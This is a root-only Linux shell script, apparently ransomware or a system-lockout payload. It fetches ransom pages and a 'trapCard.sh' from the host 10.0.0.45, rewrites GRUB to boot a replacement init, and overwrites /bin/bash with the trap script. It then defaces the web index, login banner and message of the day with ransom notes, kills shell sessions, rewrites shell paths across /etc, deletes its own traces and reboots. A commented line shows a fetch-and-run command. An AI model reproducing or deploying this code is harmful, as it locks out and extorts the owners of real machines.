#!/bin/sh

#f=ransomLinux.sh; curl http://10.0.0.45/$f ; ./$f



#THIS SCRIPT IS VERY DANGEROUS. DO NOT RUN
# ... if you aren't root ;)

if [ `id -u` -ne 0 ]; then
  echo "Must be root"
  exit
fi

url=http://10.0.0.45/ 

for f in ransom.html trapCard.sh ransom.issue; do
 curl -s "$url$f" > $f
done

apt install lynx -y 2>&1 >/dev/null

#comment out GRUB_CMDLINE_LINUX_DEFAULT
#GRUB_CMDLINE_LINUX needs to be GRUB_CMDLINE_LINUX="init=/bin/uinit"
sed -i '/.*GRUB_CMDLINE_LINUX_DEFAULT.*/c\#GRUB_CMDLINE_LINUX_DEFAULT=""' /etc/default/grub
sed -i '/.*GRUB_CMDLINE_LINUX=.*/c\GRUB_CMDLINE_LINUX="init=/bin/uinit"' /etc/default/grub
sed -i '/.*GRUB_TIMEOUT_STYLE=.*/c\GRUB_TIMEOUT_STYLE=countdown' /etc/default/grub
sed -i '/.*GRUB_CMDLINE_LINUX_DEFAULT.*/c\#GRUB_CMDLINE_LINUX_DEFAULT=""' /etc/default/grub.d/50-curtin-settings.cfg
grub-mkconfig -o /boot/grub/grub.cfg
#update-grub


cat << EOF > fini.sh
#!/bin/sh
#kill all bash
kill -9 `lsof | grep /bin/bash | awk '{print $2}'`
sleep 5
cp trapCard.sh /bin/uinit
chmod +x /bin/uinit
cp ransom.html /var/www/html/index.html
cp /bin/bash /bin/bush
cp /bin/uinit /bin/bash
#cp ransom.splash /boot/grub/splash
cp ransom.issue /etc/issue
rm -f /etc/update-motd.d/*
(echo "#!/bin/sh\necho '"; cat ransom.issue; echo "'") > /etc/update-motd.d/00-ransom
chmod +x /etc/update-motd.d/00-ransom

find /etc -type f ! -path "/etc/passwd" -exec sed -i 's|/bin/bash|/bin/bush|' {} \;
echo "trap '' INT TSTP; exit" >> /etc/bash.bashrc
echo "trap '' INT TSTP; exit" >> /etc/profile

rm -f trapCard.sh
rm -f ransom.html
rm -f ransomLinux.sh
rm -f fini.sh
#echo 1 > /proc/sys/kernel/sysrq
#echo b > /proc/sysrq-trigger
reboot
EOF
chmod +x fini.sh
nohup ./fini.sh &
